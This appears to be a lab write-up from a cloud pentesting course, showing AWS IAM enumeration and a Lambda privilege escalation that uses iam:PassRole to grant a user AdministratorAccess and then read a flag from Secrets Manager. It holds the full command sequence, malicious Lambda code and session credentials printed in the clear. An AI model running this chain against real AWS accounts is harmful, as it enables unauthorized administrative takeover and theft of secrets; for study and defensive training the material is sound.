---
title: "AWS Lambda Privilege Escalation: Exploiting iam:PassRole and IAM Role Assumption"
categories:
- Cloud Security Penetration Testing
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2026-08-13-cg-aws-assume-lambda-privilege-escalation
tags:
- AWS Pentesting
- AWS Cloud Pentesting
- EC2 Pentesting
- EC2
- Exploit Lambda
- Lambda Privilege Escalation
- Cloudgoat 
- Cloudgoat Pentesting
- AWS Red Team
- S3 Bucket Enumeration
- Exploit S3 bucket
- Lambda Pentesting
- Pacu
- web vulnerability
- ethical hacking
- bug bounty
- application security
---

## Introduction

Here, [Assume](https://www.hacksmarter.org/courses/15188ee4-104d-438c-ab1a-bb0afe42f5a7), I was provided with the AWS access key and secret key of the IAM user chris. During enumeration, I discovered that chris could assume a role with full AWS Lambda access and iam:PassRole permissions. By assuming this role and leveraging the available permissions, chris could perform privilege escalation and obtain full administrative privileges.

## Lab Environment and Initial Access

I configured provided acess key and secret for profile chris and verify credentials.

```
┌─[✗]─[jay@parrot]─[~]
└──╼ $aws configure --profile chris
AWS Access Key ID [****************W7Z7]: AKIA2R*******WUQV7J
AWS Secret Access Key [****************QzG6]: by1nR0Y******8bXZrg4u62rZv4WJy
Default region name [us-east-1]:
Default output format [json]:
```

```
┌─[✗]─[jay@parrot]─[~]
└──╼ $aws sts get-caller-identity --profile chris
{
    "UserId": "AIDA2RLAHWYYGWG3ZCET6",
    "Account": "724440692272",
    "Arn": "arn:aws:iam::724440692272:user/chris-lab"
}
```

## AWS IAM Enumeration

Once credentials verified, I initiate enumeration. To perform enumeration I created a bash script [iam_enum](https://github.com/jayvardhans/aws_enumeration/blob/main/iam_enum.sh) which can enumerate very fast. It enumerate users, group, roles, policies. Once enumeration completed I have identified:

```
============================================================
              ENUMERATION COMPLETED
============================================================
[+] Profile : chris
[+] Groups  : 0
[+] Roles   : 8
[+] Policies: 2
============================================================
```

### Enumerating IAM User

I got the IAM user details

```
[2] aws iam get-user
------------------------------------------------------------
{
    "User": {
        "Path": "/",
        "UserName": "chris-lab",
        "UserId": "AIDA2RLAHWYYGWG3ZCET6",
        "Arn": "arn:aws:iam::724440692272:user/chris-lab",
        "CreateDate": "2026-08-13T05:09:06+00:00",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-chris-lab"
            }
        ]
    }
}

[+] IAM Username : chris-lab
[+] IAM User ARN : arn:aws:iam::724440692272:user/chris-lab
```

### Enumerating IAM Roles

I list the all IAM roles 

```
[5] aws iam list-roles
------------------------------------------------------------
{
    "Roles": [
        {
            "Path": "/aws-service-role/ops.apigateway.amazonaws.com/",
            "RoleName": "AWSServiceRoleForAPIGateway",
            "RoleId": "AROA2RLAHWYYMCHZHU42N",
            "Arn": "arn:aws:iam::724440692272:role/aws-service-role/ops.apigateway.amazonaws.com/AWSServiceRoleForAPIGateway",
            "CreateDate": "2026-07-15T21:27:26+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "ops.apigateway.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "The Service Linked Role is used by Amazon API Gateway.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/organizations.amazonaws.com/",
            "RoleName": "AWSServiceRoleForOrganizations",
            "RoleId": "AROA2RLAHWYYIYYR6XMN3",
            "Arn": "arn:aws:iam::724440692272:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations",
            "CreateDate": "2026-07-15T17:22:27+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "organizations.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Service-linked role used by AWS Organizations to enable integration of other AWS services with Organizations.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/support.amazonaws.com/",
            "RoleName": "AWSServiceRoleForSupport",
            "RoleId": "AROA2RLAHWYYKQFPVYNRP",
            "Arn": "arn:aws:iam::724440692272:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
            "CreateDate": "2026-07-15T17:22:26+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "support.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Enables resource access for AWS to provide billing, administrative and support services",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
            "RoleName": "AWSServiceRoleForTrustedAdvisor",
            "RoleId": "AROA2RLAHWYYJ2LX43322",
            "Arn": "arn:aws:iam::724440692272:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
            "CreateDate": "2026-07-15T17:22:26+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "trustedadvisor.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "cg-debug-role-lab",
            "RoleId": "AROA2RLAHWYYNTZGBHF7S",
            "Arn": "arn:aws:iam::724440692272:role/cg-debug-role-lab",
            "CreateDate": "2026-08-13T05:09:06+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat debug role",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "cg-lambdaManager-role-lab",
            "RoleId": "AROA2RLAHWYYKYF2D57YK",
            "Arn": "arn:aws:iam::724440692272:role/cg-lambdaManager-role-lab",
            "CreateDate": "2026-08-13T05:09:14+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::724440692272:user/chris-lab"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat Lambda manager role",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "CourseStackAwsLabRole",
            "RoleId": "AROA2RLAHWYYFL6FMW7OW",
            "Arn": "arn:aws:iam::724440692272:role/CourseStackAwsLabRole",
            "CreateDate": "2026-07-15T17:22:36+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::662863940582:role/CourseStackAwsLabControlPlane"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CourseStack AWS Cloud Lab deploy/nuke role",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "OrganizationAccountAccessRole",
            "RoleId": "AROA2RLAHWYYJUJF2XHGK",
            "Arn": "arn:aws:iam::724440692272:role/OrganizationAccountAccessRole",
            "CreateDate": "2026-07-15T17:22:26+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::992382618926:root"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        }
    ]
}

[+] Roles discovered: 8
    -> AWSServiceRoleForAPIGateway
    -> AWSServiceRoleForOrganizations
    -> AWSServiceRoleForSupport
    -> AWSServiceRoleForTrustedAdvisor
    -> cg-debug-role-lab
    -> cg-lambdaManager-role-lab
    -> CourseStackAwsLabRole
    -> OrganizationAccountAccessRole
```

### Identifying Interesting Roles

I discover 8 roles, out of these, two roles `cg-debug-role-lab` and `cg-lambdaManager-role-lab`  are seems interesting. Let check these roles.

```
{
            "Path": "/",
            "RoleName": "cg-debug-role-lab",
            "RoleId": "AROA2RLAHWYYNTZGBHF7S",
            "Arn": "arn:aws:iam::724440692272:role/cg-debug-role-lab",
            "CreateDate": "2026-08-13T05:09:06+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat debug role",
            "MaxSessionDuration": 3600
        },
```

Role `cg-debug-role-lab`, lambda is trusted and can assume this role. That means **Lambda was trusted to assume it**.

```
{
            "Path": "/",
            "RoleName": "cg-lambdaManager-role-lab",
            "RoleId": "AROA2RLAHWYYKYF2D57YK",
            "Arn": "arn:aws:iam::724440692272:role/cg-lambdaManager-role-lab",
            "CreateDate": "2026-08-13T05:09:14+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::724440692272:user/chris-lab"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat Lambda manager role",
            "MaxSessionDuration": 3600
        },
```

Role `cg-lambdaManager-role-lab` this allow IAM user chris-lab to request STS role session. 
That means chris-lab is trusted to assume it.

## Identifying the Privilege Escalation Path

The two IAM roles form a potential privilege-escalation chain:

### Lambda Execution Role

- **`cg-debug-role-lab`** — Its trust policy allows the **AWS Lambda service** to assume the role. The trust policy alone does not grant Lambda permissions; its attached policies determine what the role can actually perform.

### Lambda Manager Role
  
- **`cg-lambdaManager-role-lab`** — Its trust policy explicitly trusts **`chris-lab`**, allowing the user to assume this role through `sts:AssumeRole`.

### Understanding iam:PassRole

```
chris-lab
    │
    │ sts:AssumeRole
    ▼
cg-lambdaManager-role-lab
    │
    │ Lambda / PassRole permissions
    ▼
Lambda execution role
    │
    ▼
Potential privilege escalation
```

Overall, `chris-lab` can assume the Lambda Manager role. If this role has Lambda and `iam:PassRole` permissions, Chris may be able to use another IAM role and gain higher privileges, potentially leading to full administrator access. The attached policies need to be checked to confirm the complete privilege escalation path.

## Analyzing the IAM Policies

I enumerate the role `cg-debug-role-lab`  and attached policy to it.

```
############################################################
# ROLE: cg-debug-role-lab
############################################################

[+] aws iam get-role --role-name cg-debug-role-lab
------------------------------------------------------------
{
    "Role": {
        "Path": "/",
        "RoleName": "cg-debug-role-lab",
        "RoleId": "AROA2RLAHWYYNTZGBHF7S",
        "Arn": "arn:aws:iam::724440692272:role/cg-debug-role-lab",
        "CreateDate": "2026-08-13T05:09:06+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "lambda.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "Description": "CloudGoat debug role",
        "MaxSessionDuration": 3600,
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-debug-role-lab"
            }
        ],
        "RoleLastUsed": {}
    }
}

[+] aws iam list-attached-role-policies
------------------------------------------------------------
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

Notice that role `cg-debug-role-lab`  has `AdministratorAccess` .

Enumerating role `cg-debug-role-lab`  and its attached policy.

```
# ROLE: cg-lambdaManager-role-lab
############################################################

[+] aws iam get-role --role-name cg-lambdaManager-role-lab
------------------------------------------------------------
{
    "Role": {
        "Path": "/",
        "RoleName": "cg-lambdaManager-role-lab",
        "RoleId": "AROA2RLAHWYYKYF2D57YK",
        "Arn": "arn:aws:iam::724440692272:role/cg-lambdaManager-role-lab",
        "CreateDate": "2026-08-13T05:09:14+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::724440692272:user/chris-lab"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "Description": "CloudGoat Lambda manager role",
        "MaxSessionDuration": 3600,
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-debug-role-lab"
            }
        ],
        "RoleLastUsed": {}
    }
}

[+] aws iam list-attached-role-policies
------------------------------------------------------------
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-lambdaManager-policy-lab",
            "PolicyArn": "arn:aws:iam::724440692272:policy/cg-lambdaManager-policy-lab"
        }
    ]
}
```

### Policy Version Enumeration

Next I enumerate the policy version of role `cg-debug-role-lab` and its attached policy name `AdministratorAccess`, found that policy running on version V1.

```
[+] aws iam get-policy
------------------------------------------------------------
{
    "Policy": {
        "PolicyName": "cg-chris-policy-lab",
        "PolicyId": "ANPA2RLAHWYYHEJ7U7CG5",
        "Arn": "arn:aws:iam::724440692272:policy/cg-chris-policy-lab",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "cg-chris-policy-lab",
        "CreateDate": "2026-08-13T05:09:06+00:00",
        "UpdateDate": "2026-08-13T05:09:06+00:00",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-chris-policy-lab"
            }
        ]
    }
}

[+] Policy Name : cg-chris-policy-lab
[+] Policy ARN  : arn:aws:iam::724440692272:policy/cg-chris-policy-lab
[+] Version ID  : v1

[+] aws iam get-policy-version
------------------------------------------------------------
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "sts:AssumeRole",
                        "iam:List*",
                        "iam:Get*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "chris"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-08-13T05:09:06+00:00"
    }
}
```

Then I enumerate the policy version of role `cg-lambdaManager-role-lab` and its attached policy name `cg-lambdaManager-policy-lab`, found that this policy also running on version V1.

```
[+] aws iam get-policy
------------------------------------------------------------
{
    "Policy": {
        "PolicyName": "cg-lambdaManager-policy-lab",
        "PolicyId": "ANPA2RLAHWYYEEEWTZUXP",
        "Arn": "arn:aws:iam::724440692272:policy/cg-lambdaManager-policy-lab",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "cg-lambdaManager-policy-lab",
        "CreateDate": "2026-08-13T05:09:06+00:00",
        "UpdateDate": "2026-08-13T05:09:06+00:00",
        "Tags": [
            {
                "Key": "Name",
                "Value": "cg-lambdaManager-policy-lab"
            }
        ]
    }
}

[+] Policy Name : cg-lambdaManager-policy-lab
[+] Policy ARN  : arn:aws:iam::724440692272:policy/cg-lambdaManager-policy-lab
[+] Version ID  : v1

[+] aws iam get-policy-version
------------------------------------------------------------
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "lambda:*",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "lambdaManager"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2026-08-13T05:09:06+00:00"
    }
}
```
## Exploiting the Lambda Privilege Escalation

1. **Assume** the `cg-lambdaManager-role-lab` (because we have permission).
2. **Create** a malicious **Lambda function** using the assumed role.
3. **Pass** the `cg-debug-role-lab` to that Lambda function.
4. When the function **runs**, it will execute with **admin permissions**!

### Step 1: Assume the `cg-lambdaManager-role-lab` Role

I started by assuming the `cg-lambdaManager-role-lab` role, using the credentials from our Chris user.

```
┌─[✗]─[jay@parrot]─[~]
└──╼ $aws sts assume-role --role-arn arn:aws:iam::724440692272:role/cg-lambdaManager-role-lab --role-session-name lambdamanager --profile chris
{
    "Credentials": {
        "AccessKeyId": "ASIA2RLAHWYYPMVZZWQL",
        "SecretAccessKey": "6EIdQuZiO4HtNj2sqey8jkMN5J00KRDMq8y3hMev",
        "SessionToken": "IQoJb3JpZ2luX2VjEBcaCXVzLWVhc3QtMSJGMEQCIDMOY+iIFgTOTtJlkNW4pdjViK39Vn2ZFTAK081ErDWOAiBJE5cBxM/zQn2gKH1CejGSE0FnLFg9pXnBVLiBzANfhCqjAgjg//////////8BEAAaDDcyNDQ0MDY5MjI3MiIMWaw9IH5H+YaSr+pwKvcBZPuDPUZp5MzYPvKgbja/yqqOq9FPQkbNMgECCiMy4rLjy8DvYwGaHVBiz1liXCJU1M+3iuaOKkG6gu8yVnO1MMC8l1v5ntdWHsYcPEBPmAmM+b3cVC98mH+Dev3GGoYLLgVIYBLTOJeKwcahvadRvcdrU/W3vdJWjN40th1+iPJCxtcjTOjLLKdmCG7GuXq5EIAkFpWEX+eRaAq+eouIn8Yke0H1TakYSscXxv8l1G7WhaLflR42NK9kMXxq7PbTNyBP0R2jomjlJrQRhk4zMwq/2OFR1Pe8qNDGSVJLieFD9X6/NkPpldMdXNbCfJ38TehlhzSDETD60PXTBjqeAQJvmcEZoNI/OL2ohQViQdEjb8NQco4NRQX2juOD71hcOfI35wAyP0UxV7aXqfFloDqQu6oTFuzZaLDcOrutzVUTlLpiwGa3wb5WUfU0HZ9o7s1BCoUn0H+5sKVs38vyK0MY78AP1McTGRAeHeXIMEzZmTfzHuauFVHKZYzQ+qkQOhJg8RNZhQYpv8ZBzWOW3DmG9C29Hwf+X7PeL5iy",
        "Expiration": "2026-08-13T07:47:22+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA2RLAHWYYKYF2D57YK:lambdamanager",
        "Arn": "arn:aws:sts::724440692272:assumed-role/cg-lambdaManager-role-lab/lambdamanager"
    }
}
```

I got the temporary credentials.

### Step 2: Configure the New Profile

I created new AWS CLI profile name `lambdamanager` using the temporary credentials.

```
┌─[✗]─[jay@parrot]─[~]
└──╼ $aws configure --profile lambdamanager
AWS Access Key ID [****************ZWQL]: ASIA2RLAHWYYPMVZZWQL
AWS Secret Access Key [****************hMev]: 6EIdQuZiO4HtNj2sqey8jkMN5J00KRDMq8y3hMev
AWS Session Token [****************L5iy]: IQoJb3JpZ2luX2VjEBcaCXVzLWVhc3QtMSJGMEQCIDMOY+iIFgTOTtJlkNW4pdjViK39Vn2ZFTAK081ErDWOAiBJE5cBxM/zQn2gKH1CejGSE0FnLFg9pXnBVLiBzANfhCqjAgjg//////////8BEAAaDDcyNDQ0MDY5MjI3MiIMWaw9*********q+eouIn8Yke0H1TakYSscXxv8l1G7WhaLflR42NK9kMXxq7PbTNyBP0R2jomjlJrQRhk4zMwq/2OFR1Pe8qNDGSVJLieFD9X6/NkPpldMdXNbCfJ38TehlhzSDETD60PXTBjqeAQJvmcEZoNI/OL2ohQViQdEjb8NQco4NRQX2juOD71hcOfI35wAyP0UxV7aXqfFloDqQu6oTFuzZaLDcOrutzVUTlLpiwGa3wb5WUfU0HZ9o7s1BCoUn0H+5sKVs38vyK0MY78AP1McTGRAeHeXIMEzZmTfzHuauFVHKZYzQ+qkQOhJg8RNZhQYpv8ZBzWOW3DmG9C29Hwf+X7PeL5iy
Default region name [us-east-1]: us-east-1
Default output format [json]: json
```

Verify the credentials.

```
┌─[jay@parrot]─[~]
└──╼ $aws sts get-caller-identity --profile lambdamanager
{
    "UserId": "AROA2RLAHWYYKYF2D57YK:lambdamanager",
    "Account": "724440692272",
    "Arn": "arn:aws:sts::724440692272:assumed-role/cg-lambdaManager-role-lab/lambdamanager"
}
```

### Step 3: Creating the Malicious Lambda Function

I created lambda function using below code and zip it

```
┌─[jay@parrot]─[~]
└──╼ $vim lambda_function.py

┌─[jay@parrot]─[~]
└──╼ $cat lambda_function.py
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(UserName = 'chris-lab', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return response

┌─[jay@parrot]─[~]
└──╼ $zip -r lambda_function.zip lambda_function.py
  adding: lambda_function.py (deflated 29%)  
```

### Step 4: Deploy the Lambda Function

Then I deploy the Lambda function and pass it the powerful cg-debug-role-lab which has Administrator access.

```
┌─[jay@parrot]─[~]
└──╼ $aws lambda create-function --function-name admin --runtime python3.9 --role arn:aws:iam::724440692272:role/cg-debug-role-lab --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.zip --profile lambdamanager --region us-east-1
{
    "FunctionName": "admin",
    "FunctionArn": "arn:aws:lambda:us-east-1:724440692272:function:admin",
    "Runtime": "python3.9",
    "Role": "arn:aws:iam::724440692272:role/cg-debug-role-lab",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 346,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2026-08-13T07:03:44.119+0000",
    "CodeSha256": "a5eNNE8Yb54wGeLqDjfsvaO5mNIhk2/OJsOyHj73BsM=",
    "Version": "$LATEST",
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "09da8fe1-95e2-4dbb-83e4-32744ca06b7e",
    "State": "Pending",
    "StateReason": "The function is being created.",
    "StateReasonCode": "Creating",
    "PackageType": "Zip",
    "Architectures": [
        "x86_64"
    ],
    "EphemeralStorage": {
        "Size": 512
    },
    "SnapStart": {
        "ApplyOn": "None",
        "OptimizationStatus": "Off"
    },
    "RuntimeVersionConfig": {
        "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:b46f7bc0f3da8071d1b824471f2c69c8766b756b827eb0455d2118c622ae7bcf"
    },
    "LoggingConfig": {
        "LogFormat": "Text",
        "LogGroup": "/aws/lambda/admin"
    }
}
```

Lambda function created successfully. Lambda assumes the debug role on execution.

### Step 5: Invoke the Lambda Function

Now, I invoke the function to trigger privilege escalation and check it’s output.

```
┌─[jay@parrot]─[~]
└──╼ $aws lambda invoke --function-name admin out.txt --profile lambdamanager
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

```
┌─[jay@parrot]─[~]
└──╼ $cat out.txt
{"ResponseMetadata": {"RequestId": "7c58cb7d-e5ef-4a9c-b774-4a5e5fffa357", "HTTPStatusCode": 200, "HTTPHeaders": {"date": "Thu, 13 Aug 2026 07:05:27 GMT", "x-amzn-requestid": "7c58cb7d-e5ef-4a9c-b774-4a5e5fffa357", "content-type": "text/xml", "content-length": "212"}, "RetryAttempts": 0}}
```

Lambda function executed successfully, verify the output out.txt also.

### Step 6: Verify Administrator Access

Verify the the attached policy for user `chris-lab`. 

```
┌─[jay@parrot]─[~/cloudgoat/lambda_privesc]
└──╼ $aws iam list-attached-user-policies --user-name chris-lab --profile chris
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        },
        {
            "PolicyName": "cg-chris-policy-lab",
            "PolicyArn": "arn:aws:iam::724440692272:policy/cg-chris-policy-lab"
        }
    ]
}
```

User `chris-lab` have `AdministratorAccess` permission now.

## Secret Enumeration

Since `chris-lab` have administrative permission. I tried to list secret.

```
┌─[✗]─[jay@parrot]─[~/cloudgoat/lambda_privesc]
└──╼ $aws secretsmanager list-secrets --profile chris
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:724440692272:secret:cg-flag-lab-nxHcNl",
            "Name": "cg-flag-lab",
            "Description": "CloudGoat flag secret",
            "LastChangedDate": "2026-08-13T10:39:06.506000+05:30",
            "LastAccessedDate": "2026-08-13T05:30:00+05:30",
            "SecretVersionsToStages": {
                "terraform-hOQtzszX5rzmwqsDQpsnVvaadp": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-08-13T10:39:06.352000+05:30"
        }
    ]
}
```

Successfully list the secret. 

Next, I execute below command to get the secret value.

```

┌─[jay@parrot]─[~/cloudgoat/lambda_privesc]
└──╼ $aws secretsmanager get-secret-value --secret-id cg-flag-lab --profile chris
{
    "ARN": "arn:aws:secretsmanager:us-east-1:724440692272:secret:cg-flag-lab-nxHcNl",
    "Name": "cg-flag-lab",
    "VersionId": "terraform-hOQtzszX5rzmwqsDQpsnVvaadp",
    "SecretString": "HSM{l4mb**********_v1ct0ry}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2026-08-13T10:39:06.502000+05:30"
}
```

## How to Prevent This Attack

- Apply Least-Privilege IAM Policies
- Restrict iam:PassRole
- Review Lambda Execution Roles
- Restrict sts:AssumeRole
- Detection and Monitoring


